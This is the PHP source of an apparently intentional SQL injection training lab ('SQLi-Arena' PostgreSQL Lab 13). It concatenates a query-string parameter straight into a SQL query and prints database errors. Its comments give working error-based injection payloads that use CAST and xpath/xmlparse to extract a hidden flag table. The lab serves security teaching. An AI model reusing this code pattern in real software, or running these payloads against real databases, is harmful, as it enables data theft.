<?php
/*
 * SQLi-Arena. PostgreSQL Lab 13: XML Injection: xmlparse / xpath
 * SOURCE CODE (shown in White-Box mode)
 *
 * This is the vulnerable portion of the lab.
 */

// Database connection (per-lab isolation)
require_once __DIR__ . '/../../includes/db.php';

// Get user input from query string
$key = $_GET['key'];

// VULNERABLE: User input directly concatenated into query.
// PostgreSQL has built-in XML support. An attacker can use xmlparse()
// and xpath() functions to construct XML documents containing
// exfiltrated data and cause errors that leak the content.
$query = "SELECT id, config_key, config_value FROM configs WHERE config_key ILIKE '%$key%'";

$result = @pg_query($conn, $query);

if ($result && pg_num_rows($result) > 0) {
    while ($row = pg_fetch_assoc($result)) {
        echo $row['id'] . " | " . $row['config_key'] . " | " . $row['config_value'] . "\n";
    }
} elseif ($result) {
    echo "No config entries found.";
} else {
    // ERROR MESSAGES DISPLAYED: enables error-based extraction
    echo "Error: " . pg_last_error($conn);
}

// Hidden table structure:
// CREATE TABLE hidden_flags (id SERIAL, flag_value VARCHAR(200));
// The flag can be extracted using CAST error or XML/xpath techniques.
//
// XML-based extraction techniques:
// 1. CAST error: ' AND 1=CAST((SELECT flag_value FROM hidden_flags LIMIT 1) AS INTEGER) -- -
// 2. xpath with CAST: ' AND 1=CAST(xpath('/x', xmlparse(document '<x>'||(SELECT flag_value FROM hidden_flags LIMIT 1)||'</x>'))::text AS INTEGER) -- -
// 3. xmlparse error: force an XML parsing error that includes exfiltrated data
//
// The xpath() function evaluates XPath expressions against XML documents.
// Combined with xmlparse(), attacker-controlled data gets embedded in XML
// and can be extracted through error messages or CAST conversions.
